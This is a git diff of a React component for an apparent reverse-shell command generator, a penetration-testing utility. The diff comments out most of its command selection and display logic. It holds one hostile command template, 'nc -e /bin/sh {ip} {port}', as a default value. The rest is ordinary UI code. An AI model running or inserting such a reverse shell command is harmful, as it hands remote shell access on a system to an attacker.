@@ -11,7 +11,7 @@ import {
     DownloadSection,
     RevShellBodyContainer,
     ShellDisplayContainer,
-    KeyContainer,
+    // KeyContainer,
     CommandDisplayContainer,
     CommandTitle,
     ReverseShellHeader,
@@ -23,22 +23,22 @@ import {
 } from "./ReveseShellElement";
 
 import { FaDownload, FaMinus, FaPlus } from "react-icons/fa";
-import CodeSyntaxHighlighter from "../../Common/CodeSyntaxHighlighter";
-import { ShellCommands, CommandType } from "./shellData";
+// import CodeSyntaxHighlighter from "../../Common/CodeSyntaxHighlighter";
+// import { ShellCommands, CommandType } from "./shellData";
 import { BsClipboardFill } from "react-icons/bs";
 import HeadingBanner from "../../Common/HeadingBanner/HeadingBanner";
 
 function ReverseShellGenerator() {
     const [useIp, setIp] = useState("10.10.10.10");
     const [port, setPort] = useState(1337);
-    const [currentCommand, setCommand] = useState("nc -e /bin/sh {ip} {port}");
-    const [selected, setSelected] = useState("");
+    // const [currentCommand, setCommand] = useState("nc -e /bin/sh {ip} {port}");
+    // const [selected, setSelected] = useState("");
     // const [Os, setOS] = useState([]);
     const [searchInput, setSearchInput] = useState("");
-    const [selectedCategory, setSelectedCategory] = useState(Object.values(CommandType)[0]);
+    // const [selectedCategory, setSelectedCategory] = useState(Object.values(CommandType)[0]);
     const [selectedOs, setSelectedOs] = useState("all");
 
-    const rsgData = ShellCommands();
+    // const rsgData = ShellCommands();
 
     const ipChange = () => {
         setIp(document.getElementById("IP").value);
@@ -52,23 +52,23 @@ function ReverseShellGenerator() {
     //     .find((category) => category[0].meta.includes(selectedCategory))
     //     ?.map((command) => command.name) || [];
 
-    const filteredOsCommands = rsgData.shellCommands
-        .find((category) => category[0].meta.includes(selectedCategory))
-        ?.filter((command) => {
-            if (selectedOs === "all") return true;
-            return command.meta.includes(selectedOs);
-        });
+    // const filteredOsCommands = rsgData.shellCommands
+    //     .find((category) => category[0].meta.includes(selectedCategory))
+    //     ?.filter((command) => {
+    //         if (selectedOs === "all") return true;
+    //         return command.meta.includes(selectedOs);
+    //     });
 
-    const SetCurrent = (key) => {
-        setSelected(key);
-        const selectedCommand = rsgData.shellCommands
-            .find((category) => category[0].meta.includes(selectedCategory))
-            .find((command) => command.name === key);
+    // const SetCurrent = (key) => {
+    //     setSelected(key);
+    //     const selectedCommand = rsgData.shellCommands
+    //         .find((category) => category[0].meta.includes(selectedCategory))
+    //         .find((command) => command.name === key);
 
-        if (selectedCommand) {
-            setCommand(selectedCommand.command);
-        }
-    };
+    //     if (selectedCommand) {
+    //         setCommand(selectedCommand.command);
+    //     }
+    // };
 
     const chainingPort = () => {
         setPort(document.getElementById("ports").value || 0);
@@ -142,7 +142,7 @@ function ReverseShellGenerator() {
                                 alignItems: "center",
                             }}
                         >
-                            {Object.values(CommandType).map((category) => (
+                            {/* {Object.values(CommandType).map((category) => (
                                 <span
                                     key={category}
                                     onClick={() => setSelectedCategory(category)}
@@ -150,7 +150,7 @@ function ReverseShellGenerator() {
                                 >
                                     {category}
                                 </span>
-                            ))}
+                            ))} */}
                         </div>
 
                         <RevShellBodyTop>
@@ -187,7 +187,7 @@ function ReverseShellGenerator() {
                         <RevShellBodyBottom>
                             <ShellDisplayContainer>
                                 <ShellList id="shell-display">
-                                    {filteredOsCommands?.map((command) => (
+                                    {/* {filteredOsCommands?.map((command) => (
                                         <KeyContainer
                                             key={command.name}
                                             id={command.name}
@@ -198,18 +198,18 @@ function ReverseShellGenerator() {
                                         >
                                             {command.name}
                                         </KeyContainer>
-                                    ))}
+                                    ))} */}
                                 </ShellList>
                             </ShellDisplayContainer>
                             <CommandDisplayContainer>
                                 <CommandTitle>
-                                    <CodeSyntaxHighlighter
+                                    {/* <CodeSyntaxHighlighter
                                         code={currentCommand
                                             .replace(/\{ip\}/i, useIp)
                                             .replace(/\{port\}/i, port)
                                             .replace(/\{shell\}/i, selected)
                                             .replace(/\{cmd\}/i, selected)}
-                                    />
+                                    /> */}
                                 </CommandTitle>
                                 {/* // Shell Options */}
                                 {/**/}
